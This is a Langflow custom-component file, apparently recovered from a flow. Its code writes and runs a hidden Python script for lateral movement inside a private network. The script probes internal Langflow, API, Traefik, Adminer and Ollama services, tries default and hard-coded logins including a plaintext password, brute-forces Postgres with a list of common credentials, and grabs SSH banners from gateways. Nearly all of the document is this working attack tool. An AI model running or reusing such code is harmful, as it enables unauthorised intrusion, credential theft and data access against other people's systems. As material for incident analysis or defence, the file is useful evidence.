# Recovered Langflow component
# type: Lat3
# class: Lat3
# used in 1 flow(s): l3
# json path: node.data.node.template.code.value


from langflow.custom import Component
from langflow.io import Output, MessageTextInput
from langflow.schema.message import Message
import subprocess

class Lat3(Component):
    display_name="Lat3"; description="d"; icon="code"; name="Lat3"
    inputs=[MessageTextInput(name="input_value", display_name="Input", value="x")]
    outputs=[Output(name="output", display_name="Output", method="go")]
    def go(self) -> Message:
        py=r"""
import socket, urllib.request, ssl, json, psycopg2, subprocess, urllib.error
ctx=ssl._create_unverified_context()
print('lat3-start')
 

def http(url, headers=None, timeout=6, data=None, method=None):
    h={'User-Agent':'Mozilla/5.0','Accept':'*/*'}
    if headers: h.update(headers)
    r=urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read(500)
    except urllib.error.HTTPError as e:
        try: body=e.read(500)
        except: body=b''
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e).encode()

print('=== SECOND LANGFLOW 172.17.3.11 ===')
for path in ['/api/v1/version','/api/v1/auto_login','/health']:
    st,h,b=http('http://172.17.3.11:7860'+path)
    print(st, path, b[:200])
# default login
import urllib.parse
data=urllib.parse.urlencode({'username':'langflow','password':'langflow'}).encode()
st,h,b=http('http://172.17.3.11:7860/api/v1/login', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}, method='POST')
print('lf2 login', st, b[:250])
data=urllib.parse.urlencode({'username':'bci','password':'bc1lab@AIT'}).encode()
st,h,b=http('http://172.17.3.11:7860/api/v1/login', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}, method='POST')
print('lf2 bci', st, b[:250])

print('=== FRONTEND 172.17.3.5:3000 ===')
for path in ['/','/api/health','/api/status','/api/version','/login','/docs','/openapi.json']:
    st,h,b=http('http://172.17.3.5:3000'+path, timeout=8)
    print(st, path, h.get('Server',''), b[:180])
st,h,b=http('http://frontend:3000/', timeout=8)
print('frontend name', st, b[:180])

print('=== API 172.17.3.9:8000 ===')
for path in ['/','/docs','/openapi.json','/health','/api','/api/v1','/redoc','/status']:
    st,h,b=http('http://172.17.3.9:8000'+path, timeout=8)
    print(st, path, b[:200])
st,h,b=http('http://api:8000/docs', timeout=8)
print('api name docs', st, b[:200])

print('=== APACHE 172.17.3.8:80 ===')
st,h,b=http('http://172.17.3.8/', timeout=5)
print(st, h.get('Server'), b)
for path in ['/index.html','/status','/health','.env','/server-status']:
    st,h,b=http('http://172.17.3.8'+path)
    print(st, path, b[:120])

print('=== TRAEFIK 172.17.3.2 ===')
for url in [
 'http://172.17.3.2:8080/dashboard/',
 'http://172.17.3.2:8080/api/version',
 'http://172.17.3.2:8080/api/overview',
 'http://172.17.3.2:8080/api/http/routers',
 'http://172.17.3.2:8080/api/http/services',
 'http://172.17.3.2:8080/api/rawdata',
]:
    st,h,b=http(url, timeout=5)
    print(st, url, b[:220])

print('=== ADMINER both ===')
for base in ['http://172.17.1.6:8080/','http://172.17.3.7:8080/']:
    st,h,b=http(base)
    print(st, base, b[:120])

print('=== OLLAMA both ===')
for base in ['http://172.17.1.5:11434/api/tags','http://172.17.3.10:11434/api/tags']:
    st,h,b=http(base)
    print(st, base, b[:250])

print('=== POSTGRES sweep known creds ===')
creds=[
 ('myuser','mypassword'),
 ('myuser','password'),
 ('postgres','postgres'),
 ('postgres','mypassword'),
 ('postgres','password'),
 ('langflow','langflow'),
 ('root','root'),
]
hosts=['172.17.1.3','172.17.1.4','172.17.3.2','172.17.3.6','172.17.3.12','172.17.0.1','172.17.1.1','172.17.3.1']
import psycopg2
for host in hosts:
  for user,pw in creds:
    try:
      c=psycopg2.connect(host=host, port=5432, user=user, password=pw, dbname='postgres', connect_timeout=2)
      cur=c.cursor(); cur.execute('select version()'); ver=cur.fetchone()[0][:60]
      cur.execute('select datname from pg_database')
      dbs=[r[0] for r in cur.fetchall()]
      print('PGOK', host, user, pw, dbs, ver)
      c.close()
    except Exception as e:
      msg=str(e).split('\n')[0][:90]
      if 'timeout' not in msg.lower() and 'Connection refused' not in msg:
        if 'password authentication failed' not in msg:
          print('PG', host, user, msg)

print('=== HOST SSH / GATEWAY ===')
for host in ['172.17.0.1','172.17.1.1','172.17.3.1']:
    try:
        s=socket.socket(); s.settimeout(2); s.connect((host,22)); print('SSH', host, s.recv(80)); s.close()
    except Exception as e:
        print('SSH', host, e)
# try metadata? no
print('DONE_LAT3')
"""
        open('/tmp/lat3.py','w').write(py)
        return Message(text=subprocess.getoutput('python /tmp/lat3.py'))
